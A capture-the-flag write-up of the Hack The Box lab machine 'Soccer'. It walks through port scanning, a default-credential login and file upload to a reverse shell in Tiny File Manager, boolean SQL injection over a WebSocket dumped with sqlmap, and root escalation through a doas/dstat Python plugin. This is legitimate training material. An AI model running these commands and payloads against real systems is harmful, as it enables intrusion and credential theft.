# Soccer

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 -p- -sV soccer.htb
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-20 13:25 EDT
Stats: 0:04:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 61.78% done; ETC: 13:32 (0:02:40 remaining)
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
```

Trying dirsearch, we don’t find anything, so we try with gobuster and a different wordlist

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u <http://soccer.htb> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://soccer.htb>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> <http://soccer.htb/tiny/>]
Progress: 20115 / 20116 (100.00%)
```

Browsing to the tiny directory, we find a login page for Tiny File Manager service

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FMLrCpOhWLgoz7TJA7n87%2Fimage.png?alt=media&#x26;token=c3f54936-8484-4e88-805e-7e137490a09b" alt=""><figcaption></figcaption></figure>

We find default creds for the service and are able to log in using default admin creds admin:admin@123

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F3a3Fw6uGc7eD7Oo1G8Ce%2Fimage.png?alt=media&#x26;token=76a6561f-ddf2-42fa-a3c8-f07e75eadb1e" alt=""><figcaption></figcaption></figure>

We are logged in and find out it is version 2.4.3

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FlLSfXEwm74HhqPJUb0oB%2Fimage.png?alt=media&#x26;token=ea924516-95f3-4584-b76a-d19e28aeea37" alt=""><figcaption></figcaption></figure>

This version is vulnerable to file uploads. If we can upload a file inside the upload directory, we will be able to get a reverse shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FQfGp6m9xoZQH7Fw2bIvJ%2Fimage.png?alt=media&#x26;token=57b22e9c-56c2-42a5-9058-b879ae3bd616" alt=""><figcaption></figcaption></figure>

We get the full path to the file

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F24y4RYh3XFowChzjoOWq%2Fimage.png?alt=media&#x26;token=fa170bbd-d268-4fb8-b17f-8291cc091ad0" alt=""><figcaption></figcaption></figure>

We can access it from our browser and execute it, which gives us the reverse shell

From the reverse shell, we can look at the nginx config and find a vhost we were not able to find during vhost fuzzing

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FQwpb8F243gmI44sZRJiX%2Fimage.png?alt=media&#x26;token=446f18bd-3d35-43f4-affc-64b284f4ea7c" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FcqSvr6ybpVVEPbwtwCdl%2Fimage.png?alt=media&#x26;token=cfd64a78-ca6c-43f6-b93d-851d16ad0fd8" alt=""><figcaption></figcaption></figure>

We add it to our /etc/hosts file

We find a page that allows us to check if our ticket number is valid

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FCSP2RzhW0uuiEEXjyowK%2Fimage.png?alt=media&#x26;token=6930e8d1-a876-4933-bd4f-3a00053fff10" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FqVqdVyCGCRgwq8vp1pQH%2Fimage.png?alt=media&#x26;token=21824fe2-b2cb-47e8-99ba-9464c55df7e6" alt=""><figcaption></figcaption></figure>

It looks like a boolean comparison. We attempt to add OR 1 = 1 and it says valid. We can deduce it is vulnerable to SQL injection

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FerjV4r4EVdieJogpVASd%2Fimage.png?alt=media&#x26;token=2c85e3b3-bb2d-45b1-8328-096b3201780b" alt=""><figcaption></figcaption></figure>

Looking at the source code, we see that the request is sent to a Web Socket

On burp if we send a request to a WebSocket and don’t get a response back, try to uncheck and check again the blue button

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FnqI454G2ybYIsXHG6OuG%2Fimage.png?alt=media&#x26;token=5fc17dd8-5fad-42fd-9b3b-a18c7fd402da" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FMp7NPeMB0Ji4Slrf7reD%2Fimage.png?alt=media&#x26;token=3a5ca9ab-5335-45e7-af62-b7a0f52c334d" alt=""><figcaption></figcaption></figure>

Test web socket connection

```bash
wscat -c soc-player.soccer.htb:9091/
```

The SQL injection is boolean. That means the website changes between 2 states depending on if the request is true or false. Enumerating manually would be very long so we can automate with sqlmap

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

Then dump the data

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch

Database: soccer_db
Table: accounts
[2 entries]
+-------+-------------------+----------------------+----------+
| id    | email             | password             | username |
+-------+-------------------+----------------------+----------+
| 1324  | player@player.htb | PlayerOftheMatch2022 | player   |
| 60761 | test@test.com     | test                 | test     |
+-------+-------------------+----------------------+----------+
```

We can login via SSH as the player user

Running linpeas, we find that the binary doas (same as sudo) is SUID and that we can execute the command dstat as root without password

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FhlnaFGj2B3Vph7YclUWB%2Fimage.png?alt=media&#x26;token=7480f0ae-0723-44f5-98eb-0f75b016aba8" alt=""><figcaption></figcaption></figure>

We find on GTFObins the payload

```bash
player@soccer:~$ echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
player@soccer:~$ /usr/local/bin/doas /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# cd /root 
# ls 
app  root.txt  run.sql  snap
# cat root.txt
```
